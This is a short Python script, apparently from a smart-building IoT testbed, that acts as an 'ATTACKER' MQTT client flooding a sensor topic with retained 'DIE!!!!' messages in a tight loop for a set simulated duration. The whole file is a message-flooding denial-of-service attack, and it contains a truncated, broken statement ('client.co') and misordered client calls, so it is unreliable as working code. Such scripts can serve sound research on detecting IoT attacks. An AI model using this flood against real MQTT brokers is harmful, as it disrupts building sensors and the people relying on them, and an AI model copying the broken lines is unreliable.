import os
import datetime
import paho.mqtt.client as mqtt
import simpy.rt
import string
from random import choice, randrange

BROKER = os.getenv('SENS_BROKER', 'localhost')
PORT = os.getenv('SENS_PORT', 1883)
NAME = os.getenv('SENS_NAME', 'quick_flood_0')
ROOM = os.getenv('SENS_ROOM', 'attack_room')
FLOOR = os.getenv('SENS_FLOOR', 'floor0')
SIM_FACTOR = float(os.getenv('SIM_FACTOR', 0.1))
# for infinite duration use 'inf'
SIM_DURATION = float(os.getenv('SIM_DURATION', '20'))
ATT_DURATION = float(os.getenv('ATTACK_DURATION', '10'))

attack_topic = "crazy_building/{}/{}/{}/".format(
    FLOOR, ROOM, NAME)


def main():
    starting_time = datetime.datetime.now()
    print("Simulation started at {}".format(starting_time))
    env = simpy.rt.RealtimeEnvironment(factor=SIM_FACTOR, strict=False)

    client = mqtt.Client(generate_ID())

    client.connect(BROKER, keepalive=600)
    client.co
    print("Connected.")

    client.subscribe(attack_topic)
    print("Subscribed to attack topic")
    client.publish(attack_topic, retain=True, payload='DIE!!!!')

    attack_process = env.process(quick_flood_attack(env, client))
    env.process(supervisor(env, attack_process, starting_time, ATT_DURATION))
    env.run(until=float(SIM_DURATION))

    client.loop_start()
    print("Simulation complete")


def quick_flood_attack(env, cli):
    i = 0
    try:
        while True:
            cli.publish(attack_topic, retain=True, payload='DIE!!!!')
            i += 1
            yield env.timeout(0.000000001)
    except simpy.Interrupt:
        print("Attack Interrupted, {} pub. sent".format(i))


def supervisor(env, attack_process, starting_time, attack_duration):
    print("Quick flood starts now, will last {} sim. seconds".format(attack_duration))
    yield env.timeout(attack_duration)
    attack_process.interrupt()


def generate_ID():
    return 'CL-' + \
           FLOOR[::len(FLOOR) - 1] + '-' + ROOM[::len(ROOM) - 1] + '-' + \
           NAME + \
           ''.join(choice(string.ascii_lowercase) for i in range(randrange(5, 15)))


if __name__ == "__main__":
    print("+++ ATTACKER +++")
    main()
